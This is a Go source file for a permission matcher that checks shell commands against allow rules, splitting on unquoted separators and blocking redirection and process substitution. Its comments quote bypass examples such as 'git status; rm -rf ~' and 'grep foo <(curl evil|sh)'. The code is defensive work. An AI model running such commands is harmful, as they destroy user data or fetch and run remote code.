package permission

import (
	"path/filepath"
	"strings"
)

func matchRule(rule Rule, toolName, pattern string) bool {
	if rule.Tool != "*" && rule.Tool != toolName {
		return false
	}

	arg := pattern
	if idx := strings.Index(pattern, ":"); idx >= 0 {
		arg = pattern[idx+1:]
	}

	// Bash commands containing shell separators or substitution markers
	// must be split into segments and EVERY segment must independently
	// match an allow rule. Without this, a rule like "git status" would
	// approve "git status; rm -rf ~" because the matcher only saw the
	// first token. The wildcard rule "*" still matches anything.
	if toolName == "bash" && rule.Pattern != "*" && hasShellSeparator(arg) {
		// Redirection and process substitution markers (<, >, <(, >()
		// cannot be safely split into independent segments — bash
		// nests the inner command inside the outer one's syntax, and
		// our segmenter doesn't re-enter those. Refuse to match rather
		// than risk allowing a bypass like `grep foo <(curl evil|sh)`.
		if containsUnquoted(arg, "<") || containsUnquoted(arg, ">") {
			return false
		}
		segments := splitShellSegments(arg)
		for _, seg := range segments {
			seg = strings.TrimSpace(seg)
			if seg == "" {
				continue
			}
			if !globMatch(rule.Pattern, seg) {
				return false
			}
		}
		return len(segments) > 0
	}

	return globMatch(rule.Pattern, arg)
}

// hasShellSeparator reports whether s contains a shell command
// separator or substitution marker OUTSIDE of single or double quotes.
// Quoted separators are part of an argument to a single command (e.g.
// `grep 'a|b' file.txt` or `awk '/foo|bar/ {print}'`) and don't bypass
// the permission check.
func hasShellSeparator(s string) bool {
	var inSingle, inDouble bool
	for i := 0; i < len(s); i++ {
		c := s[i]
		// Honor bash backslash escapes outside single quotes so
		// `\"` is treated as a literal `"` instead of as opening
		// a quoted region. Without this, `echo \" ; touch /pwn`
		// would hide its `;` behind an incorrectly-opened quote.
		// Parity fix with internal/sandbox.
		if c == '\\' && !inSingle {
			i++
			continue
		}
		if c == '\'' && !inDouble {
			inSingle = !inSingle
			continue
		}
		if c == '"' && !inSingle {
			inDouble = !inDouble
			continue
		}
		if inSingle || inDouble {
			continue
		}
		switch c {
		case ';':
			return true
		case '|':
			return true
		case '&':
			// "&" alone is background; "&&" is and-list. Both bypass.
			return true
		case '`':
			return true
		case '\n':
			return true
		case '>', '<':
			// Redirection operators — a redirection can invoke
			// process substitution "<(cmd)" / ">(cmd)" which bash
			// expands to a nested command. Even simple redirections
			// like ">file" can subvert read-only policies, so force
			// segment-level analysis (which currently has no way to
			// allow any redirection and therefore denies).
			return true
		case '$':
			if i+1 < len(s) && s[i+1] == '(' {
				return true
			}
		}
	}
	return false
}

// splitShellSegments splits s on TOP-LEVEL shell separators into
// individual command segments. Honors single and double quotes so
// `grep 'a|b' file` produces a single segment, not two.
func splitShellSegments(s string) []string {
	var segments []string
	var current strings.Builder
	var inSingle, inDouble bool
	flush := func() {
		seg := current.String()
		current.Reset()
		if seg != "" {
			segments = append(segments, seg)
		}
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == '\'' && !inDouble {
			inSingle = !inSingle
			current.WriteByte(c)
			continue
		}
		if c == '"' && !inSingle {
			inDouble = !inDouble
			current.WriteByte(c)
			continue
		}
		if !inSingle && !inDouble {
			switch c {
			case ';', '\n':
				flush()
				continue
			case '|':
				flush()
				if i+1 < len(s) && s[i+1] == '|' {
					i++
				}
				continue
			case '&':
				flush()
				if i+1 < len(s) && s[i+1] == '&' {
					i++
				}
				continue
			}
		}
		current.WriteByte(c)
	}
	flush()
	return segments
}

// containsUnquoted reports whether s contains any of the characters in
// needle outside of single or double quotes. Used to detect shell
// redirection operators that would otherwise bypass rule matching.
// Backslash escapes the next char outside single quotes (same as bash)
// so `\"` doesn't accidentally open a quoted region.
func containsUnquoted(s, needle string) bool {
	var inSingle, inDouble bool
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == '\\' && !inSingle {
			i++
			continue
		}
		if c == '\'' && !inDouble {
			inSingle = !inSingle
			continue
		}
		if c == '"' && !inSingle {
			inDouble = !inDouble
			continue
		}
		if inSingle || inDouble {
			continue
		}
		if strings.IndexByte(needle, c) >= 0 {
			return true
		}
	}
	return false
}

func globMatch(pattern, value string) bool {
	if pattern == "*" {
		return true
	}

	matched, err := filepath.Match(pattern, value)
	if err == nil && matched {
		return true
	}

	// Proper '**' handling: pattern 'a/**/b' must match prefix 'a/' AND
	// suffix 'b'. Previously we only checked the prefix and threw away
	// the suffix, so '/safe/**/file.go' permitted '/safe/anything.txt'.
	// That's a security bug for any path-scoped rule.
	if strings.Contains(pattern, "**") {
		segs := strings.Split(pattern, "**")
		if len(segs) == 2 {
			prefix, suffix := segs[0], segs[1]
			if strings.HasPrefix(value, prefix) && strings.HasSuffix(value, suffix) &&
				len(value) >= len(prefix)+len(suffix) {
				return true
			}
		}
	}

	// Handle space-separated command patterns (e.g. "git *" matches "git status").
	// Use Fields (not SplitN) so multiple spaces / tabs collapse correctly —
	// 'git   diff' was previously a false negative against rule 'git diff *'.
	if strings.Contains(pattern, " ") {
		parts := strings.Fields(pattern)
		valueParts := strings.Fields(value)
		if len(valueParts) >= 1 && len(parts) >= 1 && parts[0] == valueParts[0] {
			if len(parts) == 1 {
				return true
			}
			if len(parts) > 1 && parts[1] == "*" {
				return true
			}
			if len(parts) > 1 && len(valueParts) > 1 {
				// Recurse on the joined tail so multi-token patterns
				// like 'git diff --cached' still work.
				return globMatch(strings.Join(parts[1:], " "), strings.Join(valueParts[1:], " "))
			}
		}
	}

	return pattern == value
}
